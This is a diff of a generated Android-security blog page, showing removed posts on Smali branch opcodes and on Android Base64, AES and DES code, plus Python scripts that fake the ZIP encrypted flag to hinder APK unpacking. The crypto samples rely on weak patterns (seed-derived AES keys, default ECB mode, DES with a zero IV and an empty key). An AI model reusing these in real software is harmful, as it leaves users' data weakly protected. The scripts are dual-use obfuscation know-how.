-<h3 id="0x03-条件跳转分支"><a href="#0x03-条件跳转分支" class="headerlink" title="0x03 条件跳转分支"></a>0x03 条件跳转分支</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&quot;if-eq vA, vB, :cond_**&quot;   如果vA等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ne vA, vB, :cond_**&quot;   如果vA不等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-lt vA, vB, :cond_**&quot;    如果vA小于vB则跳转到:cond_**</span><br><span class="line">&quot;if-ge vA, vB, :cond_**&quot;   如果vA大于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-gt vA, vB, :cond_**&quot;   如果vA大于vB则跳转到:cond_**</span><br><span class="line">&quot;if-le vA, vB, :cond_**&quot;    如果vA小于等于vB则跳转到:cond_**</span><br><span class="line">&quot;if-eqz vA, :cond_**&quot;   如果vA等于0则跳转到:cond_**</span><br><span class="line">&quot;if-nez vA, :cond_**&quot;   如果vA不等于0则跳转到:cond_**</span><br><span class="line">&quot;if-ltz vA, :cond_**&quot;    如果vA小于0则跳转到:cond_**</span><br><span class="line">&quot;if-gez vA, :cond_**&quot;   如果vA大于等于0则跳转到:cond_**</span><br><span class="line">&quot;if-gtz vA, :cond_**&quot;   如果vA大于0则跳转到:cond_**</span><br><span class="line">&quot;if-lez vA, :cond_**&quot;    如果vA小于等于0则跳转到:cond_**</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-  <link itemprop="mainEntityOfPage" href="http://blog.safebuff.com/2016/09/22/Android-Encrypt-and-Decrypt/">
-
-  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
-    <meta itemprop="name" content="xl7dev">
-    <meta itemprop="description" content="">
-    <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
-  </span>
-
-  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-    <meta itemprop="name" content="xl7dev">
-    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
-      <img style="display:none;" itemprop="url image" alt="xl7dev" src="">
-    </span>
-  </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/09/22/Android-Encrypt-and-Decrypt/" itemprop="url">
-                  Android Encrypt and Decrypt
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-22T11:15:19+08:00">
-                2016-09-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-
-          
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-Base64"><a href="#0x01-Base64" class="headerlink" title="0x01 Base64"></a>0x01 Base64</h3><blockquote>
-<p>Encrypt</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import android.util.Base64;</span><br><span class="line">String str = &quot;hello world&quot;;</span><br><span class="line">String base64str = Base64.encodeToString(str.getBytes(),Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>Decrypt</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byte[] m = Base64.decode(base64str,Base64.DEFAULT);</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-AES"><a href="#0x02-AES" class="headerlink" title="0x02 AES"></a>0x02 AES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import java.security.SecureRandom;</span><br><span class="line">import javax.crypto.Cipher;</span><br><span class="line">import javax.crypto.KeyGenerator;</span><br><span class="line">import javax.crypto.SecretKey;</span><br><span class="line">import javax.crypto.spec.SecretKeySpec;</span><br><span class="line">/**</span><br><span class="line"> * Usage:</span><br><span class="line"> * &lt;pre&gt;</span><br><span class="line"> * String crypto = SimpleCrypto.encrypt(masterpassword, cleartext)</span><br><span class="line"> * String cleartext = SimpleCrypto.decrypt(masterpassword, crypto)</span><br><span class="line"> * &lt;/pre&gt;</span><br><span class="line"> */</span><br><span class="line">public class SimpleCrypto &#123;</span><br><span class="line">    public static String encrypt(String seed, String cleartext)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] result = encrypt(rawKey, cleartext.getBytes());</span><br><span class="line">        return toHex(result);</span><br><span class="line">    &#125;</span><br><span class="line">    public static String decrypt(String seed, String encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        byte[] rawKey = getRawKey(seed.getBytes());</span><br><span class="line">        byte[] enc = toByte(encrypted);</span><br><span class="line">        byte[] result = decrypt(rawKey, enc);</span><br><span class="line">        return new String(result);</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] getRawKey(byte[] seed) throws Exception &#123;</span><br><span class="line">        KeyGenerator kgen = KeyGenerator.getInstance(&quot;AES&quot;);</span><br><span class="line">        SecureRandom sr = SecureRandom.getInstance(&quot;SHA1PRNG&quot;);</span><br><span class="line">        sr.setSeed(seed);</span><br><span class="line">        kgen.init(128, sr); // 192 and 256 bits may not be available</span><br><span class="line">        SecretKey skey = kgen.generateKey();</span><br><span class="line">        byte[] raw = skey.getEncoded();</span><br><span class="line">        return raw;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] encrypt(byte[] raw, byte[] clear) throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] encrypted = cipher.doFinal(clear);</span><br><span class="line">        return encrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    private static byte[] decrypt(byte[] raw, byte[] encrypted)</span><br><span class="line">            throws Exception &#123;</span><br><span class="line">        SecretKeySpec skeySpec = new SecretKeySpec(raw, &quot;AES&quot;);</span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;AES&quot;);</span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, skeySpec);</span><br><span class="line">        byte[] decrypted = cipher.doFinal(encrypted);</span><br><span class="line">        return decrypted;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(String txt) &#123;</span><br><span class="line">        return toHex(txt.getBytes());</span><br><span class="line">    &#125;</span><br><span class="line">    public static String fromHex(String hex) &#123;</span><br><span class="line">        return new String(toByte(hex));</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] toByte(String hexString) &#123;</span><br><span class="line">        int len = hexString.length() / 2;</span><br><span class="line">        byte[] result = new byte[len];</span><br><span class="line">        for (int i = 0; i &lt; len; i++)</span><br><span class="line">            result[i] = Integer.valueOf(hexString.substring(2 * i, 2 * i + 2),</span><br><span class="line">                    16).byteValue();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String toHex(byte[] buf) &#123;</span><br><span class="line">        if (buf == null)</span><br><span class="line">            return &quot;&quot;;</span><br><span class="line">        StringBuffer result = new StringBuffer(2 * buf.length);</span><br><span class="line">        for (int i = 0; i &lt; buf.length; i++) &#123;</span><br><span class="line">            appendHex(result, buf[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        return result.toString();</span><br><span class="line">    &#125;</span><br><span class="line">    private final static String HEX = &quot;0123456789ABCDEF&quot;;</span><br><span class="line">    private static void appendHex(StringBuffer sb, byte b) &#123;</span><br><span class="line">        sb.append(HEX.charAt((b &gt;&gt; 4) &amp; 0x0f)).append(HEX.charAt(b &amp; 0x0f));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="0x03-DES"><a href="#0x03-DES" class="headerlink" title="0x03 DES"></a>0x03 DES</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class Des4 &#123;  </span><br><span class="line">    // 密钥  如果 密匙不足 8个 字符  java代码 要加 \0</span><br><span class="line">    // 例如 secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line">    // 由于我们后台设置的密匙为7位，造成了一系列的麻烦，后经过查询php            // 文档解决，添加secretKey = &quot;xxxxxxx\0&quot;; </span><br><span class="line"></span><br><span class="line">    private final static String secretKey = &quot;&quot;;  </span><br><span class="line">    private static byte[] iv = &#123;0, 0, 0, 0, 0, 0, 0, 0&#125;;  </span><br><span class="line"></span><br><span class="line">    public static String encode(String plainText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.ENCRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] encryptedData = cipher.doFinal(plainText.getBytes());  </span><br><span class="line">        return Base64.encodeToString(encryptedData, 1);  </span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line">    public static String decode(String encryptText) throws Exception &#123;  </span><br><span class="line">        IvParameterSpec zeroIv = new IvParameterSpec(iv);  </span><br><span class="line">        SecretKeySpec key = new SecretKeySpec(secretKey.getBytes(), &quot;DES&quot;);  </span><br><span class="line">        Cipher cipher = Cipher.getInstance(&quot;DES&quot;);  </span><br><span class="line">        cipher.init(Cipher.DECRYPT_MODE, key, zeroIv);  </span><br><span class="line">        byte[] decryptData = cipher.doFinal(Base64.decode(encryptText, 1));  </span><br><span class="line">        return new String(decryptData);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="0x04-apk伪加密"><a href="#0x04-apk伪加密" class="headerlink" title="0x04 apk伪加密"></a>0x04 apk伪加密</h3><blockquote>
-<p>pack</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def compress(self, member, src_apk):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		try:</span><br><span class="line">			data_obj = src_apk.open(member, &apos;r&apos;)</span><br><span class="line">			data = data_obj.read()</span><br><span class="line">		except RuntimeError, e:</span><br><span class="line">			print e</span><br><span class="line">			return</span><br><span class="line">		member.flag_bits |= 1</span><br><span class="line">		self.writestr(member, data)</span><br><span class="line">		print &apos;compressing %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line">	def compressall(self, src_apk):</span><br><span class="line">		map(lambda entry: self.compress(entry, src_apk), src_apk.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;Add the encrypted flag to an APK. \</span><br><span class="line">	src_apk specifies the apk file you want to add encrypted flag, dst_apk is the output apk file.&apos;)</span><br><span class="line">	parser.add_argument(&apos;src_apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;dst_apk&apos;, type=str)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line">	src_apk = ApkFile(args.src_apk, &apos;r&apos;)</span><br><span class="line">	dst_apk = ApkFile(args.dst_apk, &apos;w&apos;)</span><br><span class="line">	dst_apk.compressall(src_apk)</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>unpack</p>
-</blockquote>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import argparse</span><br><span class="line">from zipfile import ZipFile, ZipInfo</span><br><span class="line"></span><br><span class="line">class ApkFile(ZipFile):</span><br><span class="line">	def extract(self, member, path=None, pwd=None):</span><br><span class="line">		if not isinstance(member, ZipInfo):</span><br><span class="line">			member = self.getinfo(member)</span><br><span class="line">		member.flag_bits ^= member.flag_bits%2</span><br><span class="line">		ZipFile.extract(self, member, path, pwd)</span><br><span class="line">		print &apos;extracting %s&apos; % member.filename</span><br><span class="line">				</span><br><span class="line"></span><br><span class="line">	def extractall(self, path=None, members=None, pwd=None):</span><br><span class="line">		map(lambda entry: self.extract(entry, path, pwd), members if members is not None  and len(members)&gt;0 else self.filelist)</span><br><span class="line">				</span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">	parser = argparse.ArgumentParser(description=&apos;unpacks an APK that contains files which are wrongly marked as encrypted&apos;)</span><br><span class="line">	parser.add_argument(&apos;apk&apos;, type=str)</span><br><span class="line">	parser.add_argument(&apos;file&apos;, type=str, nargs=&apos;*&apos;)</span><br><span class="line">	args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">	apk = ApkFile(args.apk,&apos;r&apos;)</span><br><span class="line">	apk.extractall(members=args.file)</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -1812,7 +1513,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">73</span>
+              <span class="site-state-item-count">83</span>
               <span class="site-state-item-name">posts</span>
             </a>
           </div>
@@ -1822,7 +1523,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">58</span>
+                <span class="site-state-item-count">64</span>
                 <span class="site-state-item-name">tags</span>
               </a>
             </div>
